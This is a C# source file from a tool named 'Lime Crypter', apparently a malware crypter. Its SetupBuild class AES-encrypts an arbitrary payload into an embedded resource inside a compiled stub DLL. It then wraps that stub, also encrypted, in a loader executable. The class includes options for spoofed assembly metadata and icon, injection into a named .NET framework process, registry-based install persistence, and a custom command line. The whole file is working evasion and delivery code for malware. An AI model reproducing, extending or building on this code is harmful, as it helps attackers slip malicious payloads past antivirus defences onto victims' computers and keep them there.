using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Resources;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Lime_Crypter.Build
{
    public class SetupBuild
    {
        #region Fields
        public string PayloadName { get; set; }
        public string SaveFileName { get; set; }
        public bool IsInstall { get; set; }
        public string FileName { get; set; }
        public string FolderName { get; set; }
        public string SecondFolder { get; set; }
        public string RegistryName { get; set; }
        public string InjectionName { get; set; }
        public string AssemblyTitle { get; set; }
        public string AssemblyDescription { get; set; }
        public string AssemblyProduct { get; set; }
        public string AssemblyCompany { get; set; }
        public string AssemblyCopyright { get; set; }
        public string AssemblyTrademark { get; set; }
        public string AssemblyMajorVersion { get; set; }
        public string AssemblyMinorVersion { get; set; }
        public string AssemblyBuildPart { get; set; }
        public string AssemblyPrivatePart { get; set; }
        public string AssemblyIcon { get; set; }
        public string Stub { get; set; }
        public string Loader { get; set; }
        public string TempDirectory { get; set; }
        public string LoaderResourcesName { get; set; }
        public string StubResourcesName { get; set; }
        public string PayloadResources { get; set; }
        public string StubLib { get; set; }
        public string AesKey { get; set; }
        public string CommandLine { get; set; }
        public bool CommaLineIsChecked { get; set; }

        #endregion

        public string Compile()
        {
            string destinationIconPath = Environment.CurrentDirectory + "\\icon.ico";

            try
            {
                Directory.CreateDirectory(TempDirectory);
                string[] referencedAssemblies = new string[]
              {
            "System.dll",
            "System.Windows.Forms.dll",
            "Microsoft.CSharp.dll",
            "System.Dynamic.Runtime.dll",
            "System.Core.dll",
              };
                Dictionary<string, string> providerOptions = new Dictionary<string, string>() {
                {"CompilerVersion", "v4.0" }
            };

                #region Stub
                var compilerOptions = "/target:library /platform:x86 /optimize+";

                using (CSharpCodeProvider cSharpCodeProvider = new CSharpCodeProvider(providerOptions))
                {
                    CompilerParameters compilerParameters = new CompilerParameters(referencedAssemblies)
                    {
                        GenerateExecutable = false,
                        OutputAssembly = Path.Combine(TempDirectory, StubLib + ".dll"),
                        CompilerOptions = compilerOptions,
                        TreatWarningsAsErrors = false,
                        IncludeDebugInformation = false,
                        TempFiles = new TempFileCollection(TempDirectory, false),
                    };
                    using (ResourceWriter rw = new ResourceWriter(Path.Combine(TempDirectory, StubResourcesName + ".resources")))
                    {
                        rw.AddResource(PayloadResources, AES_Encrypt(File.ReadAllBytes(PayloadName)));
                        rw.Generate();
                    }
                    compilerParameters.EmbeddedResources.Add(Path.Combine(TempDirectory, StubResourcesName + ".resources"));

                    CompilerResults compilerResults = cSharpCodeProvider.CompileAssemblyFromSource(compilerParameters, Stub);
                    if (compilerResults.Errors.Count > 0)
                    {
                        foreach (CompilerError compilerError in compilerResults.Errors)
                        {
                            Debug.WriteLine(string.Format("{0}\nLine: {1} - Column: {2}\nFile: {3}", compilerError.ErrorText,
                                compilerError.Line, compilerError.Column, compilerError.FileName));
                            return string.Format("{0}\nLine: {1} - Column: {2}\nFile: {3}", compilerError.ErrorText,
                                compilerError.Line, compilerError.Column, compilerError.FileName);
                        }
                    }
                }
                #endregion

                #region Loader
                compilerOptions = "/target:winexe /platform:x86 /optimize+";

                if (!string.IsNullOrWhiteSpace(this.AssemblyIcon))
                {
                    File.Copy(this.AssemblyIcon, destinationIconPath, true);
                    compilerOptions += $" /win32icon:\"{destinationIconPath}\"";
                }

                using (CSharpCodeProvider cSharpCodeProvider = new CSharpCodeProvider(providerOptions))
                {
                    CompilerParameters compilerParameters = new CompilerParameters(referencedAssemblies)
                    {
                        GenerateExecutable = true,
                        OutputAssembly = this.SaveFileName,
                        CompilerOptions = compilerOptions,
                        TreatWarningsAsErrors = false,
                        IncludeDebugInformation = false,
                        TempFiles = new TempFileCollection(TempDirectory, false),
                    };
                    using (ResourceWriter rw = new ResourceWriter(Path.Combine(TempDirectory, LoaderResourcesName + ".resources")))
                    {
                        rw.AddResource(StubLib, AES_Encrypt(File.ReadAllBytes(Path.Combine(TempDirectory, StubLib + ".dll"))));
                        rw.Generate();
                    }
                    compilerParameters.EmbeddedResources.Add(Path.Combine(TempDirectory, LoaderResourcesName + ".resources"));

                    CompilerResults compilerResults = cSharpCodeProvider.CompileAssemblyFromSource(compilerParameters, Loader);
                    if (compilerResults.Errors.Count > 0)
                    {

                        foreach (CompilerError compilerError in compilerResults.Errors)
                        {
                            Debug.WriteLine(string.Format("{0}\nLine: {1} - Column: {2}\nFile: {3}", compilerError.ErrorText,
                                compilerError.Line, compilerError.Column, compilerError.FileName));
                            return string.Format("{0}\nLine: {1} - Column: {2}\nFile: {3}", compilerError.ErrorText,
                                compilerError.Line, compilerError.Column, compilerError.FileName);
                        }
                    }

                    if (File.Exists(destinationIconPath)) File.Delete(destinationIconPath);
                    if (Directory.Exists(TempDirectory)) Directory.Delete(TempDirectory, true);
                    return "Done!";
                }
                #endregion
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex);
                try
                {
                    if (File.Exists(destinationIconPath)) File.Delete(destinationIconPath);
                    if (Directory.Exists(TempDirectory)) Directory.Delete(TempDirectory, true);
                }
                catch { }
                return ex.Message;
            }
        }

        public void PrepareSource()
        {
            Loader = Loader.Replace("#Stub", StubLib);
            Loader = Loader.Replace("#ParentResource", LoaderResourcesName);
            Loader = Loader.Replace("#AesKey", AesKey);

            Loader = Loader.Replace("#AssemblyTitle", AssemblyTitle);
            Loader = Loader.Replace("#AssemblyDescription", AssemblyDescription);
            Loader = Loader.Replace("#AssemblyProduct", AssemblyProduct);
            Loader = Loader.Replace("#AssemblyCompany", AssemblyCompany);
            Loader = Loader.Replace("#AssemblyCopyright", AssemblyCopyright);
            Loader = Loader.Replace("#AssemblyTrademark", AssemblyTrademark);
            Loader = Loader.Replace("#AssemblyMajorVersion", AssemblyMajorVersion);
            Loader = Loader.Replace("#AssemblyMinorVersion", AssemblyMinorVersion);
            Loader = Loader.Replace("#AssemblyBuildPart", AssemblyBuildPart);
            Loader = Loader.Replace("#AssemblyMajorVersion", AssemblyMajorVersion);
            Loader = Loader.Replace("#AssemblyPrivatePart", AssemblyPrivatePart);
            Loader = Loader.Replace("#Guid", Guid.NewGuid().ToString());

            Stub = Stub.Replace("#ParentResource", StubResourcesName);
            Stub = Stub.Replace("#Payload", PayloadResources);
            if (InjectionName == "Itself")
            {
                InjectionName = "Application.ExecutablePath";
                Stub = Stub.Replace("#Injection", InjectionName);
            }
            else
            {
                Stub = Stub.Replace("#Injection", @"Path.Combine(RuntimeEnvironment.GetRuntimeDirectory().Replace(""Framework64"", ""Framework""), """ + InjectionName + @".exe"")");
            }
            Stub = Stub.Replace("#AesKey", AesKey);

            if (IsInstall)
                Stub = Stub.Replace("//#define install", "#define install");

            if (CommaLineIsChecked)
                Stub = Stub.Replace("#cmd", CommandLine);
            else
                Stub = Stub.Replace("#cmd", "");

            Stub = Stub.Replace("#FileName", FileName + ".exe");
            Stub = Stub.Replace("@FolderName", @"" + FolderName + @"");
            Stub = Stub.Replace("#SecondFolder", SecondFolder);
            Stub = Stub.Replace("#RegistryName", RegistryName);
        }
        private byte[] AES_Encrypt(byte[] bytesToBeEncrypted)
        {
            byte[] encryptedBytes = null;
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;
                    var passwordBytes = Encoding.UTF8.GetBytes(AesKey);
                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);
                    AES.Mode = CipherMode.CBC;
                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        cs.Close();
                    }
                    encryptedBytes = ms.ToArray();
                }
            }
            return encryptedBytes;
        }
    }
}
